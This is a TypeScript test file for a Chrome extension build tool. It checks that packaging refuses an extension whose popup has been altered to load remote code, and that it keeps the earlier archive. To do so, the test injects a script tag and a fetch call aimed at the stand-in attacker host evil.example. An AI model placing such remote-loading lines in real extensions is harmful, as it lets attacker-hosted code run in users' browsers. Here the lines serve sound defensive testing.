import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import type { BuildJobContext, BuildManifest } from '../../../packages/shared/src/buildMenu.js';
import { createChromePorts } from '../chrome/ports.js';
import { extensionFiles, popupScript, unsafeExtensionPage, unsafeExtensionScript } from '../extensions/source.js';
import { BuildMenuError } from '../grants.js';
import { materialize } from '../materialize.js';
import { ProcessLeaseRegistry } from '../processLease.js';

function context(workspace: string): BuildJobContext {
  const selection: BuildManifest['selection'] = { kind: 'chrome-extension' };
  return {
    workspace,
    jobId: 'job_chrome_remote',
    operation: { action: 'package', format: 'mv3-zip' },
    signal: new AbortController().signal,
    manifest: {
      schemaVersion: 1,
      projectId: 'app_abcdefghijkl',
      revision: 1,
      selection,
      title: 'ملاحظة',
      sourceDir: 'app',
      template: { id: 'fixture', revision: '1', lockSha256: 'a'.repeat(64) },
      consent: { autostart: false, publish: false },
    },
  };
}

test('an extension zip rejects a protocol-relative script and keeps the previous archive', async () => {
  const popup = extensionFiles('ملاحظة').find((file) => file.path === 'popup.html')?.content ?? '';
  assert.equal(unsafeExtensionPage(popup), false);
  assert.equal(unsafeExtensionScript(popupScript()), false);
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'loam-ext-remote-'));
  const ports = createChromePorts({ leases: new ProcessLeaseRegistry(200) });
  try {
    materialize({ selection: { kind: 'chrome-extension' }, workspace: root, title: 'ملاحظة' });
    const first = await ports.export(context(root), 'mv3-zip');
    const zipPath = path.join(root, first.relativePath);
    const bytes = fs.readFileSync(zipPath);
    const page = path.join(root, 'app', 'popup.html');
    const original = fs.readFileSync(page, 'utf8');
    fs.appendFileSync(page, '<script src="//evil.example/a.js"></script>');
    await assert.rejects(
      ports.export(context(root), 'mv3-zip'),
      (error: unknown) => error instanceof BuildMenuError && error.message === 'unsafe_path' && error.status === 400,
    );
    assert.equal(fs.readFileSync(zipPath).equals(bytes), true);
    fs.writeFileSync(page, original);
    fs.appendFileSync(path.join(root, 'app', 'popup.js'), "\nfetch('//evil.example/a.js');\n");
    await assert.rejects(
      ports.export(context(root), 'mv3-zip'),
      (error: unknown) => error instanceof BuildMenuError && error.message === 'unsafe_path' && error.status === 400,
    );
    assert.equal(fs.readFileSync(zipPath).equals(bytes), true);
  } finally {
    fs.rmSync(root, { recursive: true, force: true });
  }
});
